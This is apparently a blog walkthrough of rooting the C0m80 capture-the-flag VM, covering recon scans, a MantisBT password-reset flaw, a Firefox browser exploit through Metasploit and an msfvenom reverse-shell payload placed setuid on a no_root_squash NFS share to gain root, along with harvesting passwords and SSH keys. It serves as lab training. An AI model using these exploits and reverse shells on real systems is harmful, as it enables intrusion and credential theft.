Introduction
------------
This post is walk-through of how to root C0m80. The challenge is considered hard or at least it was for me. Shout out to [@3mrgnc3](https://twitter.com/3mrgnc3) for putting it together, I did come out the other end with new tricks up my sleeves. You can download the VM from [here](https://www.vulnhub.com/entry/c0m80-1,198/). Lastly, my apologies for the lengthy post, I did try my best to keep it to minimal.

Walkthrough
-----------
Enumeration is KEY if you plan on conquering c0m80. We’ll start by firing off a quick n’ dirty recon script I made, which consist of `nmap`, `nikto`, `dirb`, and `enum4linux`. You can download the script from [here](https://github.com/ihack4falafel/OSCP/blob/master/BASH/Recon.sh), I also took the liberty of removing all of the junk output that we don’t care about!

```sh
root@kali:~/Desktop/OSCP/BASH# ./Recon.sh C0m80.ctf
#----------------------------------#
#              TCP Scan            #
#----------------------------------#
Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-09-25 16:56 EDT
Nmap scan report for C0m80.ctf (192.168.127.141)
Host is up (0.00039s latency).
Not shown: 65524 closed ports
PORT STATE SERVICE VERSION
80/tcp open http Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
|_http-title: BestestSoftware Ltd.
111/tcp open rpcbind 2-4 (RPC #100000)
| rpcinfo:
| program version port/proto service
| 100000 2,3,4 111/tcp rpcbind
| 100000 2,3,4 111/udp rpcbind
| 100003 2,3,4 2049/tcp nfs
| 100003 2,3,4 2049/udp nfs
| 100005 1,2,3 39608/udp mountd
| 100005 1,2,3 40323/tcp mountd
| 100021 1,3,4 41605/tcp nlockmgr
| 100021 1,3,4 52703/udp nlockmgr
| 100024 1 55793/udp status
| 100024 1 58563/tcp status
| 100227 2,3 2049/tcp nfs_acl
|_ 100227 2,3 2049/udp nfs_acl
139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open nfs_acl 2-3 (RPC #100227)
20021/tcp open unknown
37196/tcp open mountd 1-3 (RPC #100005)
40323/tcp open mountd 1-3 (RPC #100005)
41605/tcp open nlockmgr 1-4 (RPC #100021)
49418/tcp open mountd 1-3 (RPC #100005)
58563/tcp open status 1 (RPC #100024)
MAC Address: 00:0C:29:D8:16:B4 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Network Distance: 1 hop
Service Info: Host: C0M80; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8m29s, deviation: 0s, median: 8m29s
|_nbstat: NetBIOS name: C0M80, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
| OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
| Computer name: c0m80
| NetBIOS computer name: C0M80
| Domain name:
| FQDN: c0m80
|_ System time: 2017-09-25T22:07:00+01:00
| smb-security-mode:
| account_used: guest
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

TRACEROUTE
HOP RTT ADDRESS
1 0.39 ms 192.168.127.14

Post-scan script results:
| clock-skew:
|_ 8m29s: Majority of systems scanned
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 146.16 seconds
#----------------------------------#
#            Nikto Scan            #
#----------------------------------#
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP: 192.168.127.141
+ Target Hostname: C0m80.ctf
+ Target Port: 80
+ Start Time: 2017-09-25 16:58:33 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ Server leaks inodes via ETags, header found with file /, fields: 0x2136 0x559cbfbac0f4e
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3092: /bin/: This might be interesting...
+ OSVDB-3092: /dev/: This might be interesting...
+ OSVDB-3092: /bin/: This might be interesting... possibly a system shell found.
+ OSVDB-3233: /_vti_bin/: FrontPage directory found.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8256 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time: 2017-09-25 16:59:03 (GMT-4) (30 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

- Nikto v2.1.6
---------------------------------------------------------------------------
+ No web server found on C0m80.ctf:443
---------------------------------------------------------------------------
+ 0 host(s) tested
#----------------------------------#
#            Dirb Scan             #
#----------------------------------#

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Mon Sep 25 16:59:04 2017
URL_BASE: http://C0m80.ctf/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
-----------------
GENERATED WORDS: 20458
---- Scanning URL: http://C0m80.ctf/ ----
==> DIRECTORY: http://C0m80.ctf/_vti_bin/
==> DIRECTORY: http://C0m80.ctf/_vti_cnf/
==> DIRECTORY: http://C0m80.ctf/_vti_log/
==> DIRECTORY: http://C0m80.ctf/assets/
==> DIRECTORY: http://C0m80.ctf/bin/
==> DIRECTORY: http://C0m80.ctf/bugs/
==> DIRECTORY: http://C0m80.ctf/dev/
+ http://C0m80.ctf/bugs/debug (CODE:200|SIZE:23296)
==> DIRECTORY: http://C0m80.ctf/bugs/doc/
==> DIRECTORY: http://C0m80.ctf/bugs/fonts/
==> DIRECTORY: http://C0m80.ctf/bugs/images/
==> DIRECTORY: http://C0m80.ctf/bugs/js/
==> DIRECTORY: http://C0m80.ctf/bugs/lang/
==> DIRECTORY: http://C0m80.ctf/bugs/library/
==> DIRECTORY: http://C0m80.ctf/bugs/plugins/
==> DIRECTORY: http://C0m80.ctf/bugs/scripts/
==> DIRECTORY: http://C0m80.ctf/bugs/vendor/
-----------------
END_TIME: Mon Sep 25 17:01:44 2017
DOWNLOADED: 184122 - FOUND: 3
```

Couple of things stood out for me going through the results, the web server, RPC (possible NFS export), and SMB. Started exploring URL(s) from `nikto` and `dirb` results one by one, until I bumped into mantis webpage.

<p align="center">
  <img src="https://github.com/ihack4falafel/ihack4falafel.github.io/blob/master/assets/images/mantis.png">
</p>

After quick search found the following [exploit](https://www.exploit-db.com/exploits/41890), and by simply changing the id parameter I found the following users:

```sh
#-----------------------------------------------------#----------#
#                          URL                        | Username |
#-----------------------------------------------------#----------#
# http://c0m80.ctf/bugs/verify.php?id=1&confirm_hash= | Bob      |
# http://c0m80.ctf/bugs/verify.php?id=2&confirm_hash= | Guest    |
# http://c0m80.ctf/bugs/verify.php?id=3&confirm_hash= | Jeff     |
# http://c0m80.ctf/bugs/verify.php?id=4&confirm_hash= | Alice    |
# http://c0m80.ctf/bugs/verify.php?id=5&confirm_hash= | DCheung  |
#-----------------------------------------------------#----------#
```

For some reason Alice was the only administrator account that allowed me to reset her password! Once logged in, started exploring the application to figure out a way to upload shell, ended up spending hours without luck. No worries though, turns out the application had a number of tickets that basically have everything we need to get the initial foothold on C0m80!

Again, for the sake of keeping this post consistent and short, will only share screenshots and/or snippets of information that are relevant. Also, I will not mention couple RED HERRINGS that I’ve spent a significant amount of time on. The first clue is regarding bestFTPserver (one of BestestSfotware products) in ticket number 5.

```
Bob,

I just found a really bad problem linked to that old reporting feature you added to to the project before we were using MantisBT properly.

I'll explain it over coffee at my place. It's only really an issue because Jeff won't listen about keeping the desktop apps up to date.

Meet me at six o'clock,

I'll get takeout buddy,

Alice ;)
```

And

```
I've removed the command from the list in the help menu so users don't know its there.
 
I cant remember which bits of code I changed to get it working and might break the application if I make changes.
 
Don't say anything to Jeff ;D
```

Also, I grabbed backup copy of bestFTPserver via the link provided by Bob in ticket number 1.

```
btw Ali, the backups your tools is making seem corrupted somehow :/

So I added a backup routine of my own http://c0m80.ctf/dev/ftp104.bkp

i checked them, and they can be re-encoded back into the exe and dll files ok now.

Bob ;)
```

At this point, the next logical step would be to reverse engineer `ftp104.bkp` to its original state and then figure out what the hidden feature is. Looks like backup file is hexdump with date tag. Here’s a snippet.

```sh
Tue Sep 26 08:00:01 BST 2017
------------------------------------------------------------------
0000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000 (!..............
0000010: b800 0000 0000 0000 4000 0000 0000 0000 ........ .......
0000020: 0000 0000 0000 0000 0000 0000 0000 0000 ................
0000030: 0000 0000 0000 0000 0000 0000 8000 0000 ................
0000040: 0e1f ba0e 00b4 09cd 21b8 014c cd21 5468 ...........<....
0000050: 6973 2070 726f 6772 616d 2063 616e 6e6f .....?../_../>>?
0000060: 7420 6265 2072 756e 2069 6e20 444f 5320 .......>..>..|..
0000070: 6d6f 6465 2e0d 0d0a 2400 0000 0000 0000 _?..............
```

I used bash jutsu to get it back to somewhat close to it’s original state 😀.

```sh
root@kali:~# cat /root/Desktop/ftp104.bkp | awk -F" " '{print $2 $3 $4 $5 $6 $7 $8}' > /root/Desktop/ftp104.txt
```

And then took the date out and ran the following command:

```
AWESOME BOB'S PORTING FEATUR
This tool ll auto-send b report info tmy browser Bugacker
(INFOI've not set uthe MantisBT se fully yet ju dump any repos
on github orastebin & I'lliew them manuay for now.
I'vadded a featurto bestFTPserv for this.
gards.
Bob ;
USE CMD: Repo-Link
```

It also reveals that FTP server is listening on port `20021`, going back to my nmap scan shows that C0m80 indeed have port `20021` open, Let’s check it out

```sh
root@kali:~# nc -nv 192.168.127.141 20021
192.168.127.141 20021 open
220 bestFTPserver 1.0.4 ready...
ftp>Report-Link
insert link:http://meh.com/
BugReport Link Sent to Bob...
ftp>
```

Looks like we have client-side attack vector. I fired off `msfconsole` and used autopwn with the following settings:

```sh
root@kali:~# msfconsole -q
msf > use auxiliary/server/browser_autopwn2
msf auxiliary(browser_autopwn2) > set lhost 192.168.127.128
lhost => 192.168.127.128
msf auxiliary(browser_autopwn2) > set verbose true
verbose => true
msf auxiliary(browser_autopwn2) > run
[*] Auxiliary module execution completed

[*] Searching BES exploits, please wait...
msf auxiliary(browser_autopwn2) > [*] Starting exploit modules...
[*] Starting listeners...
[*] Time spent: 19.281497042
[*] Starting the payload handler...
[*] Using URL: http://0.0.0.0:8080/99wfmWYaiRt6
[*] Starting the payload handler...
[*] Local IP: http://192.168.127.128:8080/99wfmWYaiRt6

[*] The following is a list of exploits that BrowserAutoPwn will consider using.
[*] Exploits with the highest ranking and newest will be tried first.

Exploits
========

Order Rank Name Path Payload
----- ---- ---- ---- -------
1 Excellent firefox_webidl_injection /BKJPSUjx firefox/shell_reverse_tcp on 4442
2 Excellent firefox_tostring_console_injection /AmBpV firefox/shell_reverse_tcp on 4442
3 Excellent firefox_svg_plugin /LZZcxNkS firefox/shell_reverse_tcp on 4442
4 Excellent firefox_proto_crmfrequest /ZrPO firefox/shell_reverse_tcp on 4442
5 Excellent webview_addjavascriptinterface /aDwgK android/meterpreter/reverse_tcp on 4443
6 Excellent samsung_knox_smdm_url /YKIqUAXApfE android/meterpreter/reverse_tcp on 4443
7 Great adobe_flash_worker_byte_array_uaf /hLyNKRSsiJZtN windows/meterpreter/reverse_tcp on 4444
8 Great adobe_flash_domain_memory_uaf /eJtUXAoZVBj windows/meterpreter/reverse_tcp on 4444
9 Great adobe_flash_copy_pixels_to_byte_array /ZEDkX windows/meterpreter/reverse_tcp on 4444
10 Great adobe_flash_casi32_int_overflow /pWhOBlbhImXj windows/meterpreter/reverse_tcp on 4444
11 Great adobe_flash_uncompress_zlib_uaf /pTpntOU windows/meterpreter/reverse_tcp on 4444
12 Great adobe_flash_shader_job_overflow /ccyxDUA windows/meterpreter/reverse_tcp on 4444
13 Great adobe_flash_shader_drawing_fill /KeOo windows/meterpreter/reverse_tcp on 4444
14 Great adobe_flash_pixel_bender_bof /AirstDNTOUpq windows/meterpreter/reverse_tcp on 4444
15 Great adobe_flash_opaque_background_uaf /vJbDdMXq windows/meterpreter/reverse_tcp on 4444
16 Great adobe_flash_net_connection_confusion /ctmLlwlk windows/meterpreter/reverse_tcp on 4444
17 Great adobe_flash_nellymoser_bof /XuLYG windows/meterpreter/reverse_tcp on 4444
18 Great adobe_flash_hacking_team_uaf /mToIbc windows/meterpreter/reverse_tcp on 4444
19 Good wellintech_kingscada_kxclientdownload /CJOu windows/meterpreter/reverse_tcp on 4444
20 Good ms14_064_ole_code_execution /YpqitA windows/meterpreter/reverse_tcp on 4444
21 Good adobe_flash_uncompress_zlib_uninitialized /cxaPKeGqcnGm windows/meterpreter/reverse_tcp on 4444

[+] Please use the following URL for the browser attack:
[+] BrowserAutoPwn URL: http://192.168.127.128:8080/99wfmWYaiRt6
[*] Server started.
```

And then sent Bob my malicious link via report-link. The module above did not work as expected which led me to few rabbit holes. Luckily, I had verbose turned on while running autopwn, which shows Bob’s browser details.

```sh
{"os_name"=>["Windows XP"], "os_vendor"=>["undefined"], "os_device"=>["undefined"], "ua_name"=>["Firefox"], "ua_ver"=>["13.0"], "arch"=>["x86"], "java"=>["null"], "silverlight"=>["false"], "flash"=>["null"], "vuln_test"=>["true"]}.
```

Searching for exploits close to Firefox version 13.0 in `msfconsole`, found [CVE-2012-3993](https://www.rapid7.com/db/modules/exploit/multi/browser/firefox_proto_crmfrequest), which I then used with following settings:

```sh
root@kali:~# msfconsole -q
msf > use exploit/multi/browser/firefox_proto_crmfrequest
msf exploit(firefox_proto_crmfrequest) > set lhost 192.168.127.128
lhost => 192.168.127.128
msf exploit(firefox_proto_crmfrequest) > set target 1
target => 1
msf exploit(firefox_proto_crmfrequest) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(firefox_proto_crmfrequest) > exploit
[*] Exploit running as background job.

[*] Started reverse TCP handler on 192.168.127.128:4444
msf exploit(firefox_proto_crmfrequest) > [*] Using URL: http://0.0.0.0:8080/fJeaYEpBJFmh
[*] Local IP: http://192.168.127.128:8080/fJeaYEpBJFmh
[*] Server started.
```

At last, we have reverse shell!

```sh
[*] Gathering target information for 192.168.127.141
[*] Sending HTML response to 192.168.127.141
[*] Sending HTML
[*] Sending the malicious addon
[*] Sending stage (957999 bytes) to 192.168.127.141
[*] Meterpreter session 1 opened (192.168.127.128:4444 -> 192.168.127.141:45607) at 2017-10-05 22:42:21 -0400

msf exploit(firefox_proto_crmfrequest) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: C0m80\b0b
meterpreter >
```

That’s where the post exploitation phase kicks in, I started enumerating the system looking for ways to escalate to root! Here’s the first clue:

```sh
meterpreter > ls -la
Listing: Z:\home\b0b\Desktop
============================

Mode Size Type Last modified Name
---- ---- ---- ------------- ----
100666/rw-rw-rw- 86 fil 2017-09-22 13:09:52 -0400 .save~
100666/rw-rw-rw- 318 fil 2017-09-18 23:27:29 -0400 Mozilla Firefox.desktop
40777/rwxrwxrwx 0 dir 2017-09-18 22:59:47 -0400 b0b's Documents
100666/rw-rw-rw- 281 fil 2017-09-22 13:51:32 -0400 bestFTPserver.exe.desktop
100666/rw-rw-rw- 227 fil 2017-09-22 13:04:23 -0400 cmd.exe.desktop
100666/rw-rw-rw- 362 fil 2017-09-22 11:04:55 -0400 notes.txt
100666/rw-rw-rw- 73 fil 2017-09-22 13:10:04 -0400 pwds.txt

meterpreter > cat .save~
## Reminder to self!
Get a password manager!

VNC-PASS:Al1ce1smyB3stfi3nd$12345qwert
meterpreter > cat notes.txt
These are my notes...
---------------------
I prefer the old fasioned ways of doing things if I'm honest

1. Remember to prank Jeff with Alice :D

2. Buy Metallica tickets for me and Alice for next month.

3. Call Mom for her birthday on Thursday, and remeber to take flowers at the weekend.

4. Draft a resignation letter as Jeff to send to Mr Cheong. LOL :D


meterpreter > cat pwds.txt
## Reminder to self!
I moved all my passwords to a new password manager

meterpreter >
```

Unfortunately, VNC credentials did not work and as such I had to look elsewhere for more clues which led me to the following:

```sh
meterpreter > ls -la
Listing: Z:\home\b0b\.ssh
=========================

Mode Size Type Last modified Name
---- ---- ---- ------------- ----
100666/rw-rw-rw- 181 fil 2017-09-22 23:32:09 -0400 .save~
100666/rw-rw-rw- 1766 fil 2017-09-22 16:05:59 -0400 id_rsa
100666/rw-rw-rw- 391 fil 2017-09-22 16:05:59 -0400 id_rsa.pub
100666/rw-rw-rw- 222 fil 2017-09-22 21:58:31 -0400 known_hosts

meterpreter > cat .save~
###### NO PASWORD HERE SRY ######

I'm using my new password manager

PWMangr2

just a note to say

WELL DONE & KEEP IT UP ;D

#################################
meterpreter >
```

I think we all agree now I need to search for PWMangr2.

```sh
1
2
3
4
	
meterpreter > search -f *PWMangr2*
Found 1 result...
c:\users\b0b\Application Data\Mozilla\Extensions\PWMangr2.html (71471 bytes)
meterpreter >
```

Bingo, I grabbed a copy of that file to my local machine and then was presented with password vault.

<p align="center">
  <img src="https://github.com/ihack4falafel/ihack4falafel.github.io/blob/master/assets/images/Bob_password.png">
</p>

Logged in successfully with password of “alice”! And now we have legitimate RDP credentials.

<p align="center">
  <img src="https://github.com/ihack4falafel/ihack4falafel.github.io/blob/master/assets/images/RDP_Creds.png">
</p>

Let’s pretend that we have RDP open 😀 and login to C0m80 locally with `b0b:AliceIsMyBestie`.

```sh
b0b@C0m80:~$ hostname
c0m80
```

After hunting for the obvious privilege escalation exploits on c0m80 and going down few rabbit holes AGAIN! I decided to take a break to clear my mind. I revisited my notes the following day and noticed Jeff’s instructions regarding NotepadPussPuss++ in ticket number 6.

```
Bob,

Mr Cheung has said he wants 110% on the development of NPP++.

Get to work, thats what we pay you for.

I've put the prototype application in the nfs share to assist you.

Make sure you delete it from there (or get alice to do it if you are still having access issues) when you copied it.

That is an order!

Jeff.
```

Looks like B0b is still having access issues.

```sh
b0b@C0m80:~$ cd /ftpsvr/
b0b@C0m80:/ftpsvr$ ls -la
total 676
drwxr-xr-x 3 b0b b0b 4096 Sep 23 01:07 .
drwxr-xr-x 23 root root 12288 Sep 25 22:23 ..
-rwxr-x--- 1 b0b b0b 3129 Sep 22 18:43 BestestSoftware.png
-rwxr-xr-x 1 b0b b0b 379576 Sep 23 18:25 bestFTPserver.exe
-rwxr-xr-x 1 b0b b0b 278766 Sep 23 18:25 bfsvrdll.dll
drwxrwx--- 2 root backup 4096 Sep 23 02:37 bkp
-rwxr-xr-x 1 b0b b0b 89 Sep 23 01:28 ftpsvr.sh
b0b@C0m80:/ftpsvr$ cd bkp/
bash: cd: bkp/: Permission denied
b0b@C0m80:/ftpsvr$
```

This piece of information made me realize I need to switch to user Al1ce whose a member of the backup group, well going back to my notes again I found there’s RSA key pair under B0b’s `.ssh` directory that matches al1ce’s `authorized_keys`. Let’s check what port sshd is listening on.

```sh
b0b@C0m80:/$ cat /etc/ssh/sshd_config
# Package generated configuration file
# See the sshd_config(5) manpage for details

# What ports, IPs and protocols we listen for
Port 65122
# Use these options to restrict which interfaces/protocols sshd will bind to
ListenAddress ::1
#ListenAddress 127.0.0.1
Protocol 2
```

Now let’s switch to user Al1ce (Note: I had to use backups password from B0b’s passwords vault to unlock RSA private key).

```sh
b0b@C0m80:~/.ssh$ plink -l al1ce localhost -i id_rsa -P 65122
The server's host key is not cached. You have no guarantee
that the server is the computer you think it is.
The server's rsa2 key fingerprint is:
ssh-rsa 2048 51:3a:59:ea:5d:44:4e:f8:5d:7e:47:97:99:48:87:d2
If you trust this host, enter "y" to add the key to
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n) yes
Unable to use key file "id_rsa" (OpenSSH SSH-2 private key)
Using username "al1ce".
Welcome to C0m80 :DRunning on WandawsXP SP7.4
* Documentation: https://help.ubuntu.com/

System information as of Mon Sep 25 17:59:26 BST 2017

System load: 0.0 Memory usage: 3% Processes: 119
Usage of /: 71.9% of 6.76GB Swap usage: 0% Users logged in: 0

Graph this data and manage this system at:
https://landscape.canonical.com/


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat Sep 23 03:18:49 2017 from localhost
$ id
uid=1001(al1ce) gid=34(backup) groups=34(backup)
$
```

Now if you read Jeff’s instructions and nmap results well enough, you probably know there’s NFS share that we need to explore.

```sh
root@kali:~# nmap --script=nfs-showmount c0m80.ctf -p111

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-10-04 15:55 EDT
Nmap scan report for c0m80.ctf (192.168.127.141)
Host is up (0.00041s latency).
rDNS record for 192.168.127.141: C0m80.ctf
PORT STATE SERVICE
111/tcp open rpcbind
| nfs-showmount:
|_ /ftpsvr/bkp *
MAC Address: 00:0C:29:D8:16:B4 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds
root@kali:~#
```

Let’s use a pretty neat python script called `nfspysh`, this script will allow us to interact with `/ftpsvr/bkp` NFS and issue commands such as `get`, `put`, `chmod`, etc.

```sh
root@kali:/# sudo nfspysh -o server=192.168.127.141:/ftpsvr/bkp
nfspy@192.168.127.141:/ftpsvr/bkp:/> ls
/:
040770 0 34 4096 2017-09-26 00:49:06 .
100644 34 34 2757002 2017-09-26 09:59:01 ftp104.bkp
040770 0 34 4096 2017-09-26 00:49:06 ..
nfspy@192.168.127.141:/ftpsvr/bkp:/>
```

Now cating the content of  `/etc/exports` reveals that you can upload whatever you want to `/ftpsvr/bkp` as root!

```sh
/ftpsvr/bkp &nbsp; &nbsp; &nbsp; &nbsp;*(rw,sync,no_root_squash,no_subtree_check)
```

So I created reverse shell using `msfvenom`.

```sh
root@kali:~# msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.127.128 lport=1337 -f elf -o /root/Desktop/evil
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of elf file: 152 bytes
Saved as: /root/Desktop/evil
root@kali:~# msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload linux/x86/shell_reverse_tcp
payload => linux/x86/shell_reverse_tcp
msf exploit(handler) > set lhost 192.168.127.128
lhost => 192.168.127.128
msf exploit(handler) > set lport 1337
lport => 1337
msf exploit(handler) > exploit

[*] Started reverse TCP handler on 192.168.127.128:1337
[*] Starting the payload handler...
```

And then uploaded it to C0m80.

```sh
nfspy@192.168.127.141:/ftpsvr/bkp:/> lcd /root/Desktop
nfspy@192.168.127.141:/ftpsvr/bkp:/> put evil
nfspy@192.168.127.141:/ftpsvr/bkp:/> chmod 4777 evil
nfspy@192.168.127.141:/ftpsvr/bkp:/>
```

Now all is left for us to do is run it from Al1ce’s terminal.

```sh
al1ce@C0m80:/ftpsvr/bkp$ ls -la
total 2708
drwxrwx--- 2 root backup 4096 Sep 26 05:49 .
drwxr-xr-x 3 b0b b0b 4096 Sep 23 01:07 ..
-rwsrwxrwx 1 root backup 152 Sep 26 05:49 evil
-rw-r--r-- 1 backup backup 2757002 Sep 26 05:51 ftp104.bkp
al1ce@C0m80:/ftpsvr/bkp$ ./evil
```

Voila!

```sh
[*] Started reverse TCP handler on 192.168.127.128:1337
[*] Starting the payload handler...
[*] Command shell session 1 opened (192.168.127.128:1337 -> 192.168.127.141:58583) at 2017-10-06 00:36:30 -0400

whoami && hostname
root
C0m80
```

Let’s check root flag!

```sh
cat flag.txt

############## WELL DONE ###############

You dealt BestestSoftware a killer C0m80


I really hope you enjoyed the challenge
and learned a thing of two while on your
journey here.

Please leave feelback & comments at:

https://3mrgnc3.ninja/

All the best.

3mrgnc3
;D


############ ROOT FLAG ##############

K1ll3rC0m80D3@l7&i5mash3dth1580x

######################################
```

Conclusion
----------
The main take away from this VM is no matter how good you think you’re, there’s always something that you don’t know about or never heard of. Kudos to my friend [@3mrgnc3](https://twitter.com/3mrgnc3) for this challenge, and for making sure I was on the right track throughout this journey. Feel free to contact me for questions using the comment section below or just tweet me [@ihack4falafel](https://twitter.com/ihack4falafel). I’ll leave you with my first blood proof ;D, until next time.

<p align="center">
  <img src="https://github.com/ihack4falafel/ihack4falafel.github.io/blob/master/assets/images/FirstBlood.png">
</p>
